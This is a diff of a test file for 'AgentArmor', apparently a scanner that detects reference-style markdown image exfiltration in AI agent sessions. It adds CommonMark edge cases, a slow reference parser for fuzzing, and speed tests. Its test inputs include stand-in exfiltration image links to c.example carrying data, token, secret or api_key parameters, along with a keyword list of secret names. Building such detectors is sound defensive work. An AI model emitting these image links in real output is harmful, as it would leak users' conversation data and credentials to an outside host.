@@ -47,6 +47,31 @@ describe('reference-style markdown image exfiltration (#219)', () => {
   it('accepts a scheme-relative URL', () => {
     expect(flags('![x][r]\n\n[r]: //c.example/p.png?data=1')).toBe(true);
   });
+  it('follows CommonMark: nested brackets in the alt text', () => {
+    expect(flags(`![a [b] c][r]\n\n${DEF}`)).toBe(true);
+    expect(flags(`![a [b] c]\n\n[a [b] c]: https://c.example/p.png?data=1`)).toBe(false); // a shortcut label cannot hold brackets
+  });
+  it('follows CommonMark: line breaks inside the alt text or a label, but not across a blank line', () => {
+    expect(flags(`![first\nsecond][r]\n\n${DEF}`)).toBe(true);
+    expect(flags(`![x][my\nref]\n\n[my ref]: https://c.example/p.png?data=1`)).toBe(true);
+    expect(flags(`![x][my ref]\n\n[my\nref]: https://c.example/p.png?data=1`)).toBe(true);
+    expect(flags(`![my\nref]\n\n[my ref]: https://c.example/p.png?data=1`)).toBe(true);
+    expect(flags(`![x][my\n\nref]\n\n[my ref]: https://c.example/p.png?data=1`)).toBe(false); // a blank line ends the paragraph
+    expect(flags(`![first\n\nsecond][r]\n\n${DEF}`)).toBe(false);
+  });
+  it('follows CommonMark: escaped brackets in a label or alt text', () => {
+    expect(flags('![x][a\\]b]\n\n[a\\]b]: https://c.example/p.png?data=1')).toBe(true);
+    expect(flags(`![a\\]b][r]\n\n${DEF}`)).toBe(true);
+  });
+  it('treats a lone \\r as a line ending', () => {
+    expect(flags('![x][r]\r\r[r]:\rhttps://c.example/p.png?data=1')).toBe(true);
+    expect(flags('![x][r]\r\n\r\n[r]:\r\nhttps://c.example/p.png?data=1')).toBe(true);
+  });
+  it('folds case the way CommonMark does', () => {
+    expect(flags('![x][STRASSE]\n\n[stra\u00dfe]: https://c.example/p.png?data=1')).toBe(true);
+    expect(flags('![x][Stra\u00dfe]\n\n[STRASSE]: https://c.example/p.png?data=1')).toBe(true);
+    expect(flags('![x][strasse2]\n\n[stra\u00dfe]: https://c.example/p.png?data=1')).toBe(false); // a different label
+  });
   it('the related span covers the destination, so a definition split across two turns is still caught', () => {
     const armor = AgentArmor.regexOnly();
     const sync = armor.scanSession([
@@ -115,12 +140,25 @@ describe('reference-style markdown image exfiltration (#219)', () => {
   });
 });
 
-/** Slow, independent reading of the same rules, to fuzz the regex version against. */
+/**
+ * Slow, independent reading of the same rules, to fuzz the scan against. It
+ * parses forward from every candidate start instead of pairing brackets in one
+ * pass, so a mistake in one is unlikely to be repeated in the other.
+ */
 function reference(content: string): Array<[number, number]> {
+  const n = content.length;
   const KEYWORDS = ['data', 'token', 'secret', 'key', 'context', 'conversation', 'history', 'session', 'password', 'credential', 'api_key', 'api-key', 'apikey', 'env'];
-  const isLT = (c: string) => c === '\n' || c === '\r' || c === '\u2028' || c === '\u2029';
+  const isBreakChar = (c: string | undefined) => c === '\n' || c === '\r';
   const isWs = (c: string) => /\s/.test(c);
-  const norm = (s: string) => s.trim().replace(/\s+/g, ' ').toLowerCase();
+  const norm = (s: string) => s.trim().replace(/\s+/g, ' ').toLowerCase().toUpperCase().toLowerCase();
+  /** Position after the line break at i (CRLF counts as one), or i if there is none. */
+  const afterBreak = (i: number) => (content[i] === '\r' && content[i + 1] === '\n' ? i + 2 : isBreakChar(content[i]) ? i + 1 : i);
+  /** True when the line starting at i holds nothing but spaces and tabs. */
+  const blankLineAt = (i: number) => {
+    let k = i;
+    while (content[k] === ' ' || content[k] === '\t') k++;
+    return k >= n || isBreakChar(content[k]);
+  };
   const flaggedUrl = (url: string): boolean => {
     let u = url.startsWith('<') ? url.slice(1) : url;
     const m = /^(?:https?:)?\/\//i.exec(u);
@@ -134,7 +172,7 @@ function reference(content: string): Array<[number, number]> {
     if (q < 0) return false;
     const query = u.slice(q + 1);
     for (let start = 0; start < query.length; start++) {
-      if (isWs(query[start]) || query[start] === '>') return false; // the query ends here
+      if (isWs(query[start]) || query[start] === '>') return false;
       for (const k of KEYWORDS) {
         if (query.slice(start, start + k.length).toLowerCase() !== k) continue;
         const nxt = query[start + k.length];
@@ -143,55 +181,106 @@ function reference(content: string): Array<[number, number]> {
     }
     return false;
   };
-  const flagged = new Map<string, number>();
-  for (let i = 0; i < content.length; i++) {
-    if (!(i === 0 || isLT(content[i - 1]))) continue;
+
+  /**
+   * Parse a bracketed label whose `[` is at `open`: no unescaped brackets,
+   * backslash escapes, line breaks allowed but not across a blank line.
+   * Returns the index of the closing `]`, or -1.
+   */
+  const labelEnd = (open: number, allowEmpty = false): number => {
+    let i = open + 1;
+    let items = 0;
+    while (i < n) {
+      const c = content[i];
+      if (c === ']') return items >= 1 || allowEmpty ? i : -1;
+      if (c === '[') return -1;
+      if (c === '\\') { if (i + 1 >= n) return -1; i += 2; items++; continue; }
+      if (isBreakChar(c)) {
+        const next = afterBreak(i);
+        if (blankLineAt(next)) return -1;
+        i = next; items++; continue;
+      }
+      i++; items++;
+    }
+    return -1;
+  };
+  const itemsBetween = (open: number, close: number) => {
+    let items = 0;
+    for (let i = open + 1; i < close; ) {
+      if (content[i] === '\\') i += 2;
+      else if (isBreakChar(content[i])) i = afterBreak(i);
+      else i++;
+      items++;
+    }
+    return items;
+  };
+
+  const flagged = new Set<string>();
+  for (let i = 0; i <= n; i++) {
+    const lineStart = i === 0 || content[i - 1] === '\n' || content[i - 1] === '\r' || content[i - 1] === '\u2028' || content[i - 1] === '\u2029';
+    if (!lineStart) continue;
     let p = i;
     while (content[p] === ' ' || content[p] === '\t' || content[p] === '>') p++;
     if (content[p] !== '[') continue;
-    let e = p + 1;
-    while (e < content.length && content[e] !== ']' && !isLT(content[e])) e++;
-    const labelLen = e - (p + 1);
-    if (content[e] !== ']' || labelLen < 1 || labelLen > 999) continue;
-    if (content[e + 1] !== ':') continue;
+    const e = labelEnd(p);
+    if (e < 0 || itemsBetween(p, e) > 999 || content[e + 1] !== ':') continue;
     let d = e + 2;
     while (content[d] === ' ' || content[d] === '\t') d++;
-    if (content[d] === '\r' && content[d + 1] === '\n') d++;
-    if (content[d] === '\n') { d++; while (content[d] === ' ' || content[d] === '\t' || content[d] === '>') d++; }
+    if (isBreakChar(content[d])) { d = afterBreak(d); while (content[d] === ' ' || content[d] === '\t' || content[d] === '>') d++; }
     let dest = '';
     if (content[d] === '<') {
       let g = d + 1;
-      while (g < content.length && content[g] !== '>' && !isLT(content[g])) g++;
+      while (g < n && content[g] !== '>' && !isBreakChar(content[g])) g++;
       if (content[g] !== '>' || g - (d + 1) < 1) continue;
       dest = content.slice(d, g + 1);
     } else {
-      if (d >= content.length || isWs(content[d])) continue;
+      if (d >= n || isWs(content[d])) continue;
       let g = d;
-      while (g < content.length && !isWs(content[g])) g++;
+      while (g < n && !isWs(content[g])) g++;
       dest = content.slice(d, g);
     }
-    const label = norm(content.slice(p + 1, e));
-    if (!flagged.has(label) && flaggedUrl(dest)) flagged.set(label, p);
+    if (flaggedUrl(dest)) flagged.add(norm(content.slice(p + 1, e)));
   }
+
+  /** Match of the `[` at `open` with nesting (blank lines end the search). */
+  const nestedEnd = (open: number): { end: number; inner: boolean } | undefined => {
+    let depth = 0;
+    let inner = false;
+    for (let i = open; i < n; ) {
+      const c = content[i];
+      if (c === '\\') { i += 2; continue; }
+      if (c === '[') { depth++; if (depth > 1) inner = true; }
+      else if (c === ']') { depth--; if (depth === 0) return { end: i, inner }; }
+      else if (isBreakChar(c)) {
+        const next = afterBreak(i);
+        if (blankLineAt(next)) return undefined;
+        i = next;
+        continue;
+      }
+      i++;
+    }
+    return undefined;
+  };
+
   const out: Array<[number, number]> = [];
   let i = 0;
-  while (i < content.length) {
+  while (i < n) {
     if (!(content[i] === '!' && content[i + 1] === '[')) { i++; continue; }
-    let a = i + 2;
-    while (a < content.length && content[a] !== ']' && !isLT(content[a])) a++;
-    if (content[a] !== ']') { i++; continue; }
-    const alt = content.slice(i + 2, a);
-    let end = a + 1;
+    const alt = nestedEnd(i + 1);
+    if (!alt) { i++; continue; }
+    const afterAlt = alt.end + 1;
+    let end = afterAlt;
     let label: string | undefined;
-    if (content[a + 1] === '[') {
-      let b = a + 2;
-      while (b < content.length && content[b] !== ']' && !isLT(content[b])) b++;
-      if (content[b] === ']' && b - (a + 2) <= 999) {
-        end = b + 1;
-        if (content.slice(a + 2, b).trim() !== '') label = content.slice(a + 2, b);
+    if (content[afterAlt] === '[') {
+      const le = labelEnd(afterAlt, true);
+      if (le >= 0 && itemsBetween(afterAlt, le) <= 999) {
+        end = le + 1;
+        const explicit = content.slice(afterAlt + 1, le);
+        if (explicit.trim() !== '') label = explicit;
+        else if (!alt.inner && alt.end - (i + 2) <= 999) label = content.slice(i + 2, alt.end);
       }
-    } else if (content[a + 1] === '(') { i++; continue; }
-    if (label === undefined && alt.length <= 999) label = alt;
+    } else if (content[afterAlt] === '(') { i++; continue; }
+    if (label === undefined && end === afterAlt && !alt.inner && alt.end - (i + 2) <= 999) label = content.slice(i + 2, alt.end);
     const key = label === undefined ? '' : norm(label);
     if (key !== '' && flagged.has(key)) {
       const last = out[out.length - 1];
@@ -215,29 +304,31 @@ function rng(seed: number) {
 }
 
 describe('matches a slow reference on generated documents (#219)', () => {
-  const LABELS = ['r', 'R', 'my ref', 'My   Ref', ' r ', 'x'];
+  const LABELS = ['r', 'R', 'my ref', 'My   Ref', ' r ', 'x', 'Stra\u00dfe', 'STRASSE', 'a\\]b', 'my\nref', 'my\r\nref', 'my\rref', 'a\n\nb'];
   const URLS = [
     'https://c.example/p.png?data=X', 'http://c.example/?token=1', 'https://c.example/p.png?v=3', 'https://c.example/data/p.png',
     '<https://c.example/p.png?secret=1>', 'https://c.example/?q=1&key=2', 'https://c.example/p.png?monkey=1', 'https://c.example/p.png?api_key=1',
     'ftp://c.example/?data=1', 'https://c.example/p.png?', 'https://c.example/p.png?env', '<https://c.example/p.png?data=1',
     'https://c.example/' + 'p'.repeat(300) + '.png?a=' + 'q'.repeat(300) + '&data=1', 'https://ok.example/a.png',
   ];
-  const NOISE = ['text ', ' ', '\n', '\n\n', '\r\n', '\t', '(', ')', '[', ']', '!', ':', '<', '>', '?', 'a', '\u2028', 'x'.repeat(40)];
+  const NOISE = ['text ', ' ', '\n', '\n\n', '\r\n', '\r', '\t', '(', ')', '[', ']', '[b]', '\\]', '\\[', '!', ':', '<', '>', '?', 'a', '\u2028', 'x'.repeat(40)];
   const label = (rand: () => number) => LABELS[Math.floor(rand() * LABELS.length)];
   const pick = <T,>(rand: () => number, xs: T[]) => xs[Math.floor(rand() * xs.length)];
   const piece = (rand: () => number): string => {
     const r = rand();
-    if (r < 0.22) {
+    if (r < 0.3) {
       const form = rand();
       const l = label(rand);
       if (form < 0.05) return `![${'alt '.repeat(300)}][${l}]`;
+      if (form < 0.12) return pick(rand, ['![a [b] c]', '![a\\]b]', '![first\nsecond]', '![first\r\nsecond]', '![a [b c]', '![[b]]']) + `[${l}]`;
+      if (form < 0.16) return pick(rand, ['![a [b] c]', '![first\nsecond]', '![a\\]b]']);
       if (form < 0.4) return `![alt][${l}]`;
       if (form < 0.6) return `![${l}][]`;
       if (form < 0.8) return `![${l}]`;
       if (form < 0.9) return '![alt](https://c.example/a.png)';
       return `![alt][${l}`;
     }
-    if (r < 0.5) {
+    if (r < 0.62) {
       const indent = pick(rand, ['', ' ', '   ', '    ', '\t', '> ', '>> ']);
       const sep = pick(rand, [' ', '', '\t', '\n  ', '\n\n']);
       const title = rand() < 0.2 ? ' "title"' : '';
@@ -284,6 +375,12 @@ describe('stays linear (#219)', () => {
     ['long indent before a bracket', ' '.repeat(1000) + '[\n'],
     ['block quote markers', '> > > > > > [b]: https://x.example/?data=1\n'],
     ['image openers over one far bracket', '![![![![![![![![![![x]'],
+    ['nested open brackets', '[[[[[[[[[[[[[[[['],
+    ['image openers with nested brackets', '![[![[![[!['],
+    ['backslash runs', '\\\\\\\\\\[x\\\\\\\\\\]'],
+    ['long label split by line breaks', '[' + 'word\n'.repeat(150) + ']: https://x.example/?data=1\n'],
+    ['alt text spanning many lines', '![' + 'line\n'.repeat(150) + '][b]\n'],
+    ['blank lines between brackets', '![a\n\n][b\n\n]\n'],
   ];
   it.each(shapes)('1,000,000 characters of %s scan in well under a second', (_name, unit) => {
     const text = unit.repeat(Math.ceil(1_000_000 / unit.length));
